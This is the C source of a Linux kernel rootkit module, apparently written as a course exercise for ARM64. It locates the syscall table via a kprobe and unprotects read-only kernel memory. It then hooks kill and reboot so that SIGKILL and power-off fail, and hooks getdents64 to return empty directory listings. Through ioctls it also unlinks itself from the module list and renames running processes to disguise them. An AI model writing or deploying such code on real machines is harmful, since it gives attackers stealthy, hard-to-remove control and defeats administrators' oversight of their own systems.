#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/sched/signal.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>
#include <asm/syscall.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <asm/pgtable.h>
#include <linux/reboot.h>

#include "rootkit.h"

#define OURMODNAME "rootkit"

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int major;
struct cdev *kernel_cdev;
static int is_module_hidden = 0;
static struct list_head *hidden_module = NULL;
//-----------------------------------------------------------------------------------

static unsigned long *__sys_call_table;
static void (*update_mapping_prot)(unsigned long, unsigned long, unsigned long, unsigned long);
static unsigned long start_rodata;
static unsigned long init_begin;

typedef asmlinkage unsigned long (*orgin_syscall)(const struct pt_regs *);
static orgin_syscall orig_kill;
static orgin_syscall orig_reboot;
static orgin_syscall orig_getdents64;

static struct kprobe kp = {
	.symbol_name = "kallsyms_lookup_name",
};

static unsigned long *get_syscall_table(void)
{
	unsigned long *syscall_table;
	typedef unsigned long (*kallsyms_name)(const char *name);
	kallsyms_name kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_name)kp.addr;
	unregister_kprobe(&kp);

	syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");

	printk(KERN_INFO "sys_call_table at: %p\n", syscall_table);
	printk(KERN_INFO "update_mapping_prot at: %p\n", update_mapping_prot);
	printk(KERN_INFO "start_rodata: %lx\n", start_rodata);
	printk(KERN_INFO "init_begin: %lx\n", init_begin);
	return syscall_table;
}

// hook reboot
static asmlinkage int hook_reboot(const struct pt_regs *regs)
{

	unsigned int cmd = (unsigned int)regs->regs[2];

	if (cmd == LINUX_REBOOT_CMD_POWER_OFF)
	{
		printk(KERN_INFO "Power off failed. Hahahaha!\n");
		return 0;
	}

	return orig_reboot(regs);
}

// hook kill
static asmlinkage int hook_kill(const struct pt_regs *regs)
{
	// pid_t pid = (pid_t)regs->regs[0];
	int sig = (int)regs->regs[1];

	if (sig == SIGKILL)
	{
		printk(KERN_INFO "Kill signal failed. Hahahaha!\n");
		return 0;
	}

	return orig_kill(regs);
}

// hook getdents64
static asmlinkage int hook_getdents(const struct pt_regs *regs)
{

	return 0;
}

static inline void protect_memory(void)
{
	// physical address of the start of the rodata section
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, init_begin - start_rodata, pgprot_val(PAGE_KERNEL_RO));
	printk(KERN_INFO "Protected\n");
}

static inline void unprotect_memory(void)
{
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, init_begin - start_rodata, pgprot_val(PAGE_KERNEL));
	printk(KERN_INFO "Unprotected\n");
}
//-----------------------------------------------------------------------------------

static int rootkit_open(struct inode *inode, struct file *filp)
{
	printk(KERN_INFO "%s\n", __func__);
	return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp)
{
	printk(KERN_INFO "%s\n", __func__);
	return 0;
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)
{
	long ret = 0;

	switch (ioctl)
	{
	case IOCTL_MOD_HOOK:
	{
		__sys_call_table = get_syscall_table();
		if (!__sys_call_table)
		{
			printk(KERN_INFO "Failed to get system call table\n");
			break;
		}

		// print __NR_xxxx number
		printk(KERN_INFO "kill: %d\n", __NR_kill);
		printk(KERN_INFO "reboot: %d\n", __NR_reboot);
		printk(KERN_INFO "getdents64: %d\n", __NR_getdents64);
		orig_kill = (orgin_syscall)__sys_call_table[__NR_kill];
		orig_reboot = (orgin_syscall)__sys_call_table[__NR_reboot];
		orig_getdents64 = (orgin_syscall)__sys_call_table[__NR_getdents64];

		// hook the sys call
		unprotect_memory();

		__sys_call_table[__NR_kill] = (unsigned long)&hook_kill;
		__sys_call_table[__NR_reboot] = (unsigned long)&hook_reboot;
		__sys_call_table[__NR_getdents64] = (unsigned long)&hook_getdents;

		protect_memory();

		break;
	}
	case IOCTL_MOD_HIDE:
	{
		if (is_module_hidden)
		{
			// Unhide the module by re-inserting it into the list
			list_add(&THIS_MODULE->list, hidden_module);
			is_module_hidden = 0;
			printk(KERN_INFO "Module unhidden\n");
		}
		else
		{
			// Hide the module by removing it from the list
			hidden_module = THIS_MODULE->list.prev;
			list_del(&THIS_MODULE->list);
			is_module_hidden = 1;
			printk(KERN_INFO "Module hidden\n");
		}
		break;
	}

	case IOCTL_MOD_MASQ:
	{
		struct masq_proc_req req;
		struct masq_proc *masq_array;
		size_t i;
		// Copy the masq_proc_req structure from user space
		if (copy_from_user(&req, (struct masq_proc_req *)arg, sizeof(req)))
		{
			return -EFAULT;
		}

		// Allocate memory for the masq_proc array
		masq_array = kmalloc_array(req.len, sizeof(struct masq_proc), GFP_KERNEL);
		if (!masq_array)
		{
			return -ENOMEM;
		}

		// Copy the masq_proc array from user space
		if (copy_from_user(masq_array, req.list, req.len * sizeof(struct masq_proc)))
		{
			kfree(masq_array);
			return -EFAULT;
		}

		// Iterate through the masq_proc array
		for (i = 0; i < req.len; i++)
		{
			// Here you should implement the logic to check if the process with orig_name exists,
			// and if the new_name string length is shorter than the orig_name, then masquerade the process name.
			// This part is left as an exercise.
			struct task_struct *task;
			for_each_process(task)
			{
				if (strcmp(task->comm, masq_array[i].orig_name) == 0)
				{
					size_t new_name_len = strlen(masq_array[i].new_name);
					size_t orig_name_len = strlen(masq_array[i].orig_name);
					if (new_name_len < orig_name_len)
					{
						memset(task->comm, 0, TASK_COMM_LEN);
						memcpy(task->comm, masq_array[i].new_name, new_name_len);
						printk(KERN_INFO "Process %s masqueraded as %s\n", masq_array[i].orig_name, masq_array[i].new_name);
					}
				}
			}
		}

		// Free the allocated memory
		kfree(masq_array);
		break;
	}

	break;
	case IOCTL_FILE_HIDE:

		break;
	default:
		ret = -EINVAL;
	}
	return ret;
}

struct file_operations fops = {
	open : rootkit_open,
	unlocked_ioctl : rootkit_ioctl,
	release : rootkit_release,
	owner : THIS_MODULE
};

static int __init rootkit_init(void)
{

	int ret;

	dev_t dev_no, dev;
	kernel_cdev = cdev_alloc();
	kernel_cdev->ops = &fops;
	kernel_cdev->owner = THIS_MODULE;

	__sys_call_table = get_syscall_table();
	if (!__sys_call_table)
	{
		printk(KERN_INFO "Failed to get sys_call_table\n");
		return -1;
	}

	ret = alloc_chrdev_region(&dev_no, 0, 1, "rootkit");
	if (ret < 0)
	{
		pr_info("major number allocation failed\n");
		return ret;
	}

	major = MAJOR(dev_no);
	dev = MKDEV(major, 0);
	printk("The major number for your device is %d\n", major);
	ret = cdev_add(kernel_cdev, dev, 1);
	if (ret < 0)
	{
		pr_info(KERN_INFO "unable to allocate cdev");
		return ret;
	}

	return 0;
}

static void __exit rootkit_exit(void)
{
	// TODO: unhook syscall
	unprotect_memory();

	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
	__sys_call_table[__NR_reboot] = (unsigned long)orig_reboot;
	__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;

	protect_memory();

	pr_info("%s: removed\n", OURMODNAME);
	cdev_del(kernel_cdev);
	unregister_chrdev_region(major, 1);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
